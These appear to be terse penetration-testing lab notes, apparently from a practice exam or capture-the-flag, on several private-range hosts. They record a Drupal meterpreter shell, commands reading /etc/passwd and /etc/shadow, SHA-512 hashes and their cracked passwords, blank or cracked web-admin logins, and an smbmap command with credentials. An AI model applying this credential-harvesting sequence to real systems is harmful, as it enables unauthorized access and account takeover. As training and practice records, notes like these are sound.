# 192.168.100.51 WIN2
Found users
Administrator            Guest                    steven  

WINSERVER-02
Flag found in administrator desktop
53a781552d604b75948b778b352ee97b







# 192.168.100.52 LIN1

Tried to register with all the emails given.
Said that admin@syntex.com is already registered
`The e-mail address admin@syntex.com is already registered.`
Admin email: admin@syntex.com

Got meterpreter for service acct on drupal
Dump:
`cat /etc/passwd | grep -v /nologin | grep -v /bin/false`
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync   --> system acct
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash --> system
auditor:x:1001:1001::/home/auditor:/bin/bash
dbadmin:x:1002:1002::/home/dbadmin:/bin/bash

username: dbadmin
password: sayang
RDP in and got root
cat /etc/passwd | grep -v /nologin | grep -v /bin/false
cat /etc/shadow
```
root:$6$v8b2/P8T26uEUwvM$TBiao8o1dfqQrGPPcebRj6A6cNiixcy6/r/AFtN5Swk7N1kpg/8UyQK0pXFwdLfy5Ed/71VN91nJ6.3JyAN/00:18998:0:99999:7:::
auditor:$6$RNJCCrE9ok/yCMqD$7uPoYFsrnR3wPnSwPeLuBEiXgAzlOzGW6uZSyX.IjNNVcR5.bDBhb.dlZTN37JJR4yZXXQTetuUhOOX9ZNov6/:19099:0:99999:7:::
dbadmin:$6$1HAbXNNxXVVNCcoi$6Zy2gjvyZZYHTwSyxSLsdv0LA.5hA7EeD1WhUFzHg9SOSXrz7DxX7iG0mCQbmEBSo.yjB1c80iIujSM6Fjbpo/:19099:0:99999:7:::
```

Unshadowed and cracked
sayang           (dbadmin)     
qwertyuiop       (auditor)

mysql enum
Found users for drupal
admin
auditor
dbadmin
vincenzo


# 192.168.100.50 WIN1
found phpmyadmin creds
root:: (blank)


Found wordpress creds from cracking MD5

admin:: estrella

Manage to login to wp-admin




# 192.168.100.55 WIN3

smbmap -u lawrence -p "computadora" -d . -H 192.168.100.55
lawrence::computadora